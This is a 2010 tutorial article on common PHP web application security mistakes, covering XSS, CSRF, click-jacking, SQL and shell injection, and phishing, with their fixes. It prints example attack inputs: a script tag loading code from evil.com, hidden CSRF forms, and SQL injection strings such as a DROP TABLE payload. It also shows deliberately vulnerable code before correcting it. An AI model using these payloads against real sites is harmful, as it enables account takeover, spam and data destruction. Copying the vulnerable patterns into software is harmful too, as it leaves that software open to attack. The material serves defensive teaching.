---
title: Common Security Mistakes in Web Applications
slug: common-security-mistakes-in-web-applications
image: >-
  https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/a9c9c9d8-bfe5-45b4-b944-0b922d1c2eae/security.jpg
date: 2010-10-18T11:44:39.000Z
author: philip-tellis
description: >-
  Web application developers today need to be skilled in a multitude of
  disciplines. It's necessary to build an application that is user friendly,
  highly performant, accessible and secure, all while executing partially in an
  untrusted environment that you, the developer, have no control over. I speak,
  of course, about the User Agent. Most commonly seen in the form of a web
  browser, but in reality, one never really knows what's on the other end of the
  HTTP connection.
categories:
  - Coding
  - PHP
  - Security
---
Web application developers today need to be skilled in a multitude of disciplines. It's necessary to build an application that is user friendly, highly performant, accessible and secure, all while executing partially in an untrusted environment that you, the developer, have no control over. I speak, of course, about the User Agent. Most commonly seen in the form of a web browser, but in reality, one never really knows what's on the other end of the HTTP connection.

There are many things to worry about when it comes to <strong>security on the Web</strong>. Is your site protected against denial of service attacks? Is your user data safe? Can your users be tricked into doing things they would not normally do? Is it possible for an attacker to pollute your database with fake data? Is it possible for an attacker to gain unauthorized access to restricted parts of your site? Unfortunately, unless we're careful with the code we write, the answer to these questions can often be one we'd rather not hear.</p>

## <span class="rh">Further Reading</span> on SmashingMag:

*   [Web Security: Are You Part Of The Problem?](https://www.smashingmagazine.com/2010/01/web-security-primer-are-you-part-of-the-problem/)
*   [10 Ways To Beef Up Your Website’s Security](https://www.smashingmagazine.com/2010/06/10-ways-to-beef-up-your-websites-security/)
*   [Content Security Policy, Your Future Best Friend](https://www.smashingmagazine.com/2016/09/content-security-policy-your-future-best-friend/)
*   [<span class="headline">Common WordPress Malware Infections</span>](https://www.smashingmagazine.com/2012/10/four-malware-infections-wordpress/)

We'll skip over denial of service attacks in this article, but take a close look at the other issues. To be more conformant with standard terminology, we'll talk about Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Phishing, Shell injection and SQL injection. We'll also assume <strong>PHP</strong> as the language of development, but the problems apply regardless of language, and solutions will be similar in other languages.

{{% feature-panel %}}

## 1\. Cross-Site Scripting (XSS)

Cross-site scripting is an attack in which a user is tricked into executing code from an attacker's site (say evil.com) in the context of our website (let's call it www.mybiz.com). This is a problem regardless of what our website does, but the severity of the problem changes depending on what our users can do on the site. Let's look at an example.

Let's say that our site allows the user to post cute little messages for the world (or maybe only their friends) to see. We'd have code that looks something like this:

<pre><code class="language-php">&lt;?php
  echo "$user said $message";
?&gt;</code></pre>

To read the message in from the user, we'd have code like this:

<pre><code class="language-php">&lt;?php
  $user = $_COOKIE['user'];
  $message = $_REQUEST['message'];
  if($message) {
     save_message($user, $message);
  }
?&gt;
&lt;input type="text" name="message" value="&lt;?php echo $message ?&gt;"&gt;</code></pre>

This works only as long as the user sticks to messages in plain text, or perhaps a few safe HTML tags like &lt;strong&gt; or &lt;em&gt;. We're essentially trusting the user to only enter safe text. An attacker, though, may enter something like this:

<pre><code class="language-php">Hi there...&lt;script src="h++p://evil.com/bad-script.js"&gt;&lt;/script&gt;</code></pre>

(Note that I've changed http to h++p to prevent auto-linking of the URL).

When a user views this message on their own page, they load <code>bad-script.js</code> into their page, and that script could do anything it wanted, for example, it could steal the contents of <code>document.cookie</code>, and then use that to impersonate the user and possibly send spam from their account, or more subtly, change the contents of the HTML page to do nasty things, possibly installing malware onto the reader's computer. Remember that <code>bad-script.js</code> now executes in the context of www.mybiz.com.

This happens because we've trusted the user more than we should. If, instead, we only allow the user to enter contents that are safe to display on the page, we prevent this form of attack. We accomplish this using PHP's <a href="https://www.php.net/manual/en/intro.filter.php">input_filter extension</a>.

We can change our PHP code to the following:

<pre><code class="language-php">&lt;?php
  $user = filter_input(INPUT_COOKIE, 'user',
                         FILTER_SANITIZE_SPECIAL_CHARS);
  $message = filter_input(INPUT_POST | INPUT_GET, 'message',
                         FILTER_SANITIZE_SPECIAL_CHARS);
  if($message) {
     save_message($user, $message);
  }
?&gt;
&lt;input type="text" name="message" value="&lt;?php echo $message ?&gt;"&gt;</code></pre>

Notice that we run the filter on the input and not just before output. We do this to protect against the situation where a new use case may arise in the future, or a new programmer comes in to the project, and forgets to <strong>sanitize data</strong> before printing it out. By filtering at the input layer, we ensure that we never store unsafe data. The side-effect of this is that if you have data that needs to be displayed in a non-web context (e.g. a mobile text message/pager message), then it may be unsuitably encoded. You may need further processing of the data before sending it to that context.

Now chances are that almost everything you get from the user is going to be written back to the browser at some point, so it may be best to just set the default filter to <code>FILTER_SANITIZE_SPECIAL_CHARS</code> by changing <code>filter.default</code> in your <code>php.ini</code> file.

PHP has many different input filters, and it's important to use the one most relevant to your data. Very often an XSS creeps in because we use <code>FILTER_SANITIZE_SPECIAL_CHARS</code> when we should have used <code>FILTER_SANITIZE_ENCODED</code> or <code>FILTER_SANITIZE_URL</code> or vice-versa. You should also carefully review any code that uses something like <a href="https://www.php.net/html_entity_decode"><code>html_entity_decode</code></a>, because this could potentially open your code up for attack by undoing the encoding added by the input filter.

If a site is open to XSS attacks, then its users' data is not safe.</p>

## 2\. Cross-Site Request Forgery (CSRF)

A CSRF (sometimes abbreviated as XSRF) is an attack where a malicious site tricks our visitors into carrying out an action on our site. This can happen if a user logs in to a site that they use a lot (e.g. e-mail, Facebook, etc.), and then visits a malicious site without first logging out. If the original site is susceptible to a CSRF attack, then the malicious site can do evil things on the user's behalf. Let's take the same example as above.

Since our application reads in input either from POST data or from the query string, an attacker could trick our user into posting a message by including code like this on their website:

<pre><code class="language-markup tmp-xml">&lt;img src="h++p://www.mybiz.com/post_message?message=Cheap+medicine+at+h++p://evil.com/"
     style="position:absolute;left:-999em;"&gt;</code></pre>

Now all the attacker needs to do, is get users of mybiz.com to visit their site. This is fairly easily accomplished by, for example, hosting a game, or pictures of cute baby animals. When the user visits the attacker's site, their browser sends a GET request to <em>www.mybiz.com/post_message</em>. Since the user is still logged in to www.mybiz.com, the browser sends along the user's cookies, thereby posting an advertisement for <em>cheap medicine</em> to all the user's friends.

Simply changing our code to only accept submissions via POST doesn't fix the problem. The attacker can change the code to something like this:

<pre><code class="language-markup tmp-xml">&lt;iframe name="pharma" style="display:none;"&gt;&lt;/iframe&gt;
&lt;form id="pform"
      action="h++p://www.mybiz.com/post_message"
      method="POST"
      target="pharma"&gt;
&lt;input type="hidden" name="message" value="Cheap medicine at ..."&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('pform').submit();&lt;/script&gt;</code></pre>

Which will POST the form back to www.mybiz.com.

The correct way to to protect against a CSRF is to use a single use token tied to the user. This token can only be issued to a signed in user, and is based on the user's account, a secret salt and possibly a timestamp. When the user submits the form, this <strong>token needs to be validated</strong>. This ensures that the request originated from a page that we control. This token only needs to be issued when a form submission can do something on behalf of the user, so there's no need to use it for publicly accessible read-only data. The token is sometimes referred to as a <em>nonce</em>.

There are several different ways to generate a nonce. For example, have a look at the <a href="https://core.trac.wordpress.org/browser/trunk/wp-includes/pluggable.php#L1268"><code>wp_create_nonce</code></a>, <a href="https://core.trac.wordpress.org/browser/trunk/wp-includes/pluggable.php#L1238"><code>wp_verify_nonce</code></a> and <a href="https://core.trac.wordpress.org/browser/trunk/wp-includes/pluggable.php#L1287"><code>wp_salt</code></a> functions in the <a href="https://core.trac.wordpress.org/browser/trunk/">Wordpress source code</a>. A simple nonce may be generated like this:

<pre><code class="language-php">&lt;?php
function get_nonce() {
  return md5($salt . ":"  . $user . ":"  . ceil(time()/86400));
}
?&gt;</code></pre>

The timestamp we use is the current time to an accuracy of 1 day (86400 seconds), so it's valid as long as the action is executed within a day of requesting the page. We could reduce that value for more sensitive actions (like password changes or account deletion). It doesn't make sense to have this value larger than the session timeout time.

An alternate method might be to generate the nonce without the timestamp, but store it as a session variable or in a server side database along with the time when the nonce was generated. That makes it harder for an attacker to generate the nonce by guessing the time when it was generated.

<pre><code class="language-php">&lt;?php
function get_nonce() {
  $nonce = md5($salt . ":"  . $user);
  $_SESSION['nonce'] = $nonce;
  $_SESSION['nonce_time'] = time();
  return $nonce;
}
?&gt;</code></pre>

We use this nonce in the input form, and when the form is submitted, we regenerate the nonce or read it out of the session variable and compare it with the submitted value. If the two match, then we allow the action to go through. If the nonce has timed out since it was generated, then we reject the request.

<pre><code class="language-php">&lt;?php
  if(!verify_nonce($_POST['nonce'])) {
     header("HTTP/1.1 403 Forbidden", true, 403);
     exit();
  }
  // proceed normally
?&gt;</code></pre>

This protects us from the CSRF attack since the attacker's website cannot generate our nonce.

If you don't use a nonce, your user can be tricked into doing things they would not normally do. Note that even if you do use a nonce, you may still be susceptible to a click-jacking attack.

## 3\. Click-Jacking

While not on the <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">OWASP top ten list for 2010</a>, click-jacking has gained recent fame due to attacks against Twitter and Facebook, both of which spread very quickly due to the social nature of these platforms.

Now since we use a nonce, we're protected against CSRF attacks, however, if the user is tricked into clicking the submit link themselves, then the nonce won't protect us. In this kind of attack, the attacker includes our website in an iframe on their own website. The attacker doesn't have control over our page, but they do control the <code>iframe</code> element. They use CSS to set the iframe's opacity to 0, and then use JavaScript to move it around such that the submit button is always under the user's mouse. This was the technique used on the <a href="https://erickerr.com/like-clickjacking">Facebook Like button click-jack attack</a>.

Frame busting appears to be the most obvious way to protect against this, however it isn't fool proof. For example, adding the <code>security="restricted"</code> attribute to an iframe will stop any frame busting code from working in Internet Explorer, and there are <a href="https://coderrr.wordpress.com/2009/02/13/preventing-frame-busting-and-click-jacking-ui-redressing/">ways</a> to prevent frame busting in Firefox as well.

A better way might be to make your submit button disabled by default and then use JavaScript to enable it once you've determined that it's safe to do so. In our example above, we'd have code like this:

<pre><code class="language-markup tmp-xml">&lt;input type="text" name="message" value="&lt;?php echo $message ?&gt;"&gt;
&lt;input id="msg_btn" type="submit" disabled="true"&gt;
&lt;script type="text/javascript"&gt;
if(top == self) {
   document.getElementById("msg_btn").disabled=false;
}
&lt;/script&gt;</code></pre>

This way we ensure that the submit button cannot be clicked on unless our page runs in a top level window. Unfortunately, this also means that users with JavaScript disabled will also be unable to click the submit button.</p>

## 4\. SQL Injection

In this kind of an attack, the attacker exploits insufficient input validation to gain shell access on your database server. XKCD has a humorous take on SQL injection:

<a href="https://xkcd.com/327/"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/fb2a3284-8578-4422-b859-fcba4d52e33f/sql.png" alt="https://xkcd.com/327/" width="550" height="169" border="0" /></a><br>
<em><a href="https://xkcd.com/327/">Full image</a> (from xkcd)</em>

Let's go back to the example we have above. In particular, let's look at the <code>save_message()</code> function.

<pre><code class="language-php">&lt;?php
function save_message($user, $message)
{
  $sql = "INSERT INTO Messages (
            user, message
          ) VALUES (
            '$user', '$message'
          )";

  return mysql_query($sql);
}
?&gt;</code></pre>

The function is oversimplified here, but it exemplifies the problem. The attacker could enter something like

<pre><code class="language-php">test');DROP TABLE Messages;--</code></pre>

When this gets passed to the database, it could end up dropping the <code>Messages</code> table, causing you and your users a lot of grief. This kind of an attack calls attention to the attacker, but little else. It's far more likely for an attacker to use this kind of attack to insert spammy data on behalf of other users. Consider this message instead:

<pre><code class="language-php">test'), ('user2', 'Cheap medicine at ...'), ('user3', 'Cheap medicine at ...</code></pre>

Here the attacker has successfully managed to insert spammy messages into the comment streams from <code>user2</code> and <code>user3</code> without needing access to their accounts. The attacker could also use this to download your entire user table that possibly includes usernames, passwords and email addresses.

Fortunately, we can use prepared statements to get around this problem. In PHP, the <a href="https://www.php.net/manual/en/class.pdo.php">PDO abstraction layer</a> makes it easy to use prepared statements even if your database itself doesn't support them. We could change our code to use PDO.

<pre><code class="language-php">&lt;?php
function save_message($user, $message)
{
  // $dbh is a global database handle
  global $dbh;

  $stmt = $dbh-&gt;prepare('
                     INSERT INTO Messages (
                          user, message
                     ) VALUES (
                          ?, ?
                     )');
  return $stmt-&gt;execute(array($user, $message));
}
?&gt;</code></pre>

This protects us from SQL injection by correctly making sure that everything in <code>$user</code> goes into the <code>user</code> field and everything in <code>$message</code> goes into the <code>message</code> field even if it contains database meta characters.

There are cases where it's hard to use prepared statements. For example, if you have a list of values in an <code>IN</code> clause. However, since our SQL statements are always generated by code, it is possible to first determine how many items need to go into the <code>IN</code> clause, and add as many <code>?</code> placeholders instead.</p>

## 5\. Shell Injection

Similar to SQL injection, the attacker tries to craft an input string to gain shell access to your web server. Once they have shell access, they could potentially do a lot more. Depending on access privileges, they could add JavaScript to your HTML pages, or gain access to other internal systems on your network.

Shell injection can take place whenever you pass untreated user input to the shell, for example by using the <a href="https://www.php.net/manual/en/function.system.php"><code>system()</code></a>, <a href="https://www.php.net/manual/en/function.exec.php"><code>exec()</code></a> or <a href="https://www.php.net/manual/en/language.operators.execution.php"><code>``</code></a> commands. There may be more functions depending on the language you use when building your web app.

The solution is the same for XSS attacks. You need to validate and sanitize all user inputs appropriately for where it will be used. For data that gets written back into an HTML page, we use PHP's <code>input_filter()</code> function with the FILTER_SANITIZE_SPECIAL_CHARS flag. For data that gets passed to the shell, we use the <a href="https://www.php.net/manual/en/function.escapeshellcmd.php"><code>escapeshellcmd()</code></a> and <a href="https://www.php.net/manual/en/function.escapeshellarg.php"><code>escapeshellarg()</code></a> functions. It's also a good idea to <strong>validate the input</strong> to make sure it only contains a whitelist of characters. Always use a whitelist instead of a blacklist. Attackers find inventive ways of getting around a blacklist.

If an attacker can gain shell access to your box, all bets are off. You may need to wipe everything off that box and reimage it. If any passwords or secret keys were stored on that box (in configuration files or source code), they will need to be changed at all locations where they are used. This could prove quite costly for your organization.</p>

## 6\. Phishing

Phishing is the process where an attacker tricks your users into handing over their login credentials. The attacker may create a page that looks exactly like your login page, and ask the user to log in there by sending them a link via e-mail, IM, Facebook, or something similar. Since the attacker's page looks identical to yours, the user may enter their login credentials without realizing that they're on a malicious site. The primary method to protect your users from phishing is user training, and there are a few things that you could do for this to be effective.

1.  Always **serve your login page over SSL**. This requires more server resources, but it ensures that the user's browser verifies that the page isn't being redirected to a malicious site.
2.  Use one and only one URL for user log in, and make it short and easy to recognize. For our example website, we could use `https://login.mybiz.com` as our login URL. It's important that when the user sees a login form for our website, they also see this URL in the URL bar. That trains users to be suspicious of login forms on other URLs
3.  Do not allow partners to ask your users for their credentials on your site. Instead, if partners need to pull user data from your site, provide them with an OAuth based API. This is also known as [the Password Anti-Pattern](https://www.designingsocialinterfaces.com/patterns.wiki/index.php?title=The_Password_Anti-Pattern).
4.  Alternatively, you could use something like a sign-in image that some websites are starting to use (e.g. Bank of America, Yahoo!). This is an image that the user selects on your website, that only the user and your website know about. When the user sees this image on the login page, they know that this is the right page. Note that if you use a sign-in seal, you should also use frame busting to make sure an attacker cannot embed your sign-in image page in their phishing page using an iframe.

If a user is trained to hand over their password to anyone who asks for it, then their data isn't safe.</p>

## Summary

While we've covered a lot in this article, it still only skims the surface of web application security. Any developer interested in building truly secure applications has to be on top of their game at all times. Stay up to date with various security related mailing lists, and make sure all developers on your team are clued in. Sometimes it may be necessary to sacrifice features for security, but the alternative is far scarier.

Finally, I'd like to thank the Yahoo! Paranoids for all their help in writing this article.</p>

## Further Reading

1.  [OWASP Top 10 security risks](https://www.owasp.org/index.php/Top_10_2010-Main)
2.  [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting)
3.  [CSRF](https://en.wikipedia.org/wiki/Cross-site_request_forgery)
4.  [Phishing](https://en.wikipedia.org/wiki/Phishing)
5.  [Code injection](https://en.wikipedia.org/wiki/Code_injection)
6.  [PHP's input filters](https://php.net/manual/en/book.filter.php)
7.  [Password anti-pattern](https://www.designingsocialinterfaces.com/patterns.wiki/index.php?title=The_Password_Anti-Pattern)
8.  [OAuth](https://oauth.net/)
9.  [Facebook Like button click-jacking](https://mashable.com/2010/05/31/facebook-like-worm-clickjack/)
10.  [Anti-anti frame-busting](https://coderrr.wordpress.com/2009/06/18/anti-anti-frame-busting/)
11.  The [Yahoo! Security Center](https://security.yahoo.com/) also has articles on how users can protect themselves online.

